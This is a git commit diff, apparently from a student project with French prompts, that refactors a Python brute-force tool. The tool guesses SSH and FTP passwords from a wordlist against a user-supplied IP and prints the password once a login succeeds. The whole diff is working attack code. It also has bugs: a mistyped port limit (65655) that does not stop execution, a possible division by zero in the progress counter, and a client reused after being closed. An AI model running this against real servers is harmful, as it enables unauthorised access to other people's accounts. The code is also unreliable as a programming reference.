54c2c9ede7b617a66b5a91544fdaeafa70853414
ThomasDebain <thomasdebain@gmail.com>
2024-04-17 20:08:51 +0200

    Remerge to master

--- partie2/__init__.py
+++ partie2/__init__.py
@@ -1,15 +1,22 @@
 import paramiko
 from ftplib import FTP
+import re
 
-def brute_ssh(host, port, username, password):
+step = 100
+
+def verify_IPv4(input: str)-> bool:
+	if isinstance(input, str):
+		ipv4_regex = re.compile(r'^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$')
+		if ipv4_regex.match(input):
+			return True
+	return False
+
+def brute_ssh(host, port, username, password, client):
     try:
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         client.connect(hostname=host, port=port, username=username, password=password)
         print("[*] Successfully logged in via SSH!")
         return True
     except paramiko.AuthenticationException:
-        print("[!] Invalid credentials for SSH")
         return False
     except Exception as e:
         print(f"[!] Error: {e}")
@@ -17,9 +24,9 @@ def brute_ssh(host, port, username, password):
     finally:
         client.close()
 
-def brute_ftp(host, port, username, password):
+
+def brute_ftp(host, port, username, password, ftp):
     try:
-        ftp = FTP()
         ftp.connect(host, port)
         ftp.login(username, password)
         print("[*] Successfully logged in via FTP!")
@@ -30,26 +37,35 @@ def brute_ftp(host, port, username, password):
     finally:
         ftp.quit()
 
-def main():
+
+def bruteforce():
     protocol = input("Choisissez le protocole à bruteforcer (SSH ou FTP) : ").strip().lower()
     host = input("Entrez l'adresse IP du serveur : ")
+    if not verify_IPv4(host):
+        print("l'ip est invalide")
+        return
     port = int(input("Entrez le port du serveur : "))
+    if (port > 65655) or (port < 0):
+        print("port invalide")
     username = input("Entrez le nom d'utilisateur : ")
     password_list = input("Entrez le chemin du fichier contenant les mots de passe : ")
 
     with open(password_list, 'r') as f:
         passwords = f.readlines()
-
-    for password in passwords:
+    if protocol not in ['ssh', 'ftp']:
+        print("[!] Protocole invalide, veuillez choisir entre SSH ou FTP")
+        exit(1)
+    (protocol_function, client) = (brute_ssh, paramiko.SSHClient()) if protocol == 'ssh' else (brute_ftp, FTP())
+    if protocol == 'ssh':
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        
+    percent_step = len(passwords) // step
+    percent_factor = step / len(passwords)
+    for (num_password, password) in enumerate(passwords):
         password = password.strip()
-        if protocol == 'ssh':
-            if brute_ssh(host, port, username, password):
-                break
-        elif protocol == 'ftp':
-            if brute_ftp(host, port, username, password):
-                break
-        else:
-            print("[!] Protocole invalide, veuillez choisir entre SSH ou FTP")
-
-if __name__ == "__main__":
-    main()
+        if not num_password % percent_step:
+            percent = num_password * percent_factor
+            print(f"mots de passe vérifiés : {percent}%")
+        if protocol_function(host, port, username, password, client):
+            print(f"Le mot de passe est : {password}")
+            break
